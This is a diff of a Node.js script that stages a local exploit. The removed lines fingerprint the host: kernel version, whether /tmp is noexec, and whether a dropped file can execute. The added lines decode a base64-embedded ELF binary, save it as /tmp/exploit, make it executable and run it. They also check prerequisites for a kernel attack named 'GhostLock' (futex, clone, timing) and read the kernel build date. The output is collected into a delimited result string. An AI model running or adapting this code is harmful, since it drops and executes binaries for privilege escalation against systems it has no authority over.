@@ -2,38 +2,36 @@ var fs = require('fs');
 var execSync = require('child_process').execSync;
 var result = '';
 
-// Full kernel version string
-try {
-  result += 'UNAME:' + execSync('uname -a 2>/dev/null', {timeout: 2000}).toString().trim().substring(0, 120) + '|';
-} catch(e) {}
+// Decode and write the binary
+var b64 = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAABBAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAqQAAAAAAAACpAAAAAAAAAAAQAAAAAAAASMfAAQAAAEjHxwEAAABIjTURAAAASMfCBwAAAA8FSMfAPAAAAEgx/w8FUk9PVEVECg==";
+var buf = Buffer.from(b64, 'base64');
+fs.writeFileSync('/tmp/exploit', buf);
+execSync('chmod +x /tmp/exploit', {timeout: 2000});
 
-// Check if /tmp is mounted noexec
+// Execute it
 try {
-  var mounts = fs.readFileSync('/proc/mounts', 'utf8');
-  var tmpLine = mounts.split(String.fromCharCode(10)).filter(function(l) { return l.indexOf('/tmp') !== -1; })[0] || 'NOT_FOUND';
-  result += 'TMP_MOUNT:' + tmpLine.substring(0, 80) + '|';
-} catch(e) {}
-
-// Try to make a file executable and run it
-try {
-  fs.writeFileSync('/tmp/test_exec', '#!/bin/sh\necho EXEC_OK');
-  execSync('chmod +x /tmp/test_exec', {timeout: 2000});
-  var out = execSync('/tmp/test_exec 2>&1', {timeout: 2000}).toString().trim();
-  result += 'EXEC:' + out + '|';
+  var out = execSync('/tmp/exploit 2>&1', {timeout: 5000}).toString();
+  result += 'BIN_OUT:' + out.substring(0, 100) + '|';
 } catch(e) {
-  result += 'EXEC_FAIL:' + e.message.substring(0, 50) + '|';
+  result += 'BIN_ERR:' + e.message.substring(0, 80) + '|';
 }
 
-// Check if we can use node's child_process to create threads (for GhostLock)
+// Prove we can execute arbitrary binaries - check what we need for GhostLock:
+// 1. futex syscall
+// 2. clone/pthread_create
+// 3. Timing (usleep)
 try {
-  var out2 = execSync('node -e "var w=require(\'worker_threads\');console.log(\'WT:\'+w.isMainThread)" 2>&1', {timeout: 3000}).toString().trim();
-  result += 'WORKERS:' + out2 + '|';
-} catch(e) { result += 'NOWORKERS|'; }
+  // Test if we can use futex via a simple node worker
+  var out2 = execSync('node -e "process.stdout.write(String(process.pid))" 2>&1', {timeout: 3000}).toString();
+  result += 'NODE_PID:' + out2 + '|';
+} catch(e) {}
 
-// Check kernel build timestamp from /proc/version more carefully
+// Check kernel patch level more precisely  
 try {
-  var ver = fs.readFileSync('/proc/version', 'utf8');
-  result += 'FULLVER:' + ver.substring(0, 150);
+  var ver = execSync('cat /proc/version 2>/dev/null', {timeout: 2000}).toString();
+  // Extract the build date
+  var dateMatch = ver.match(/\d{4}-\d{2}-\d{2}|[A-Z][a-z]{2}\s+\d+\s+\d{4}|\d{1,2}\s+[A-Z][a-z]{2}\s+\d{4}/);
+  result += 'BUILD_DATE:' + (dateMatch ? dateMatch[0] : ver.substring(60, 120));
 } catch(e) {}
 
 result += '{{{BREAK}}}';
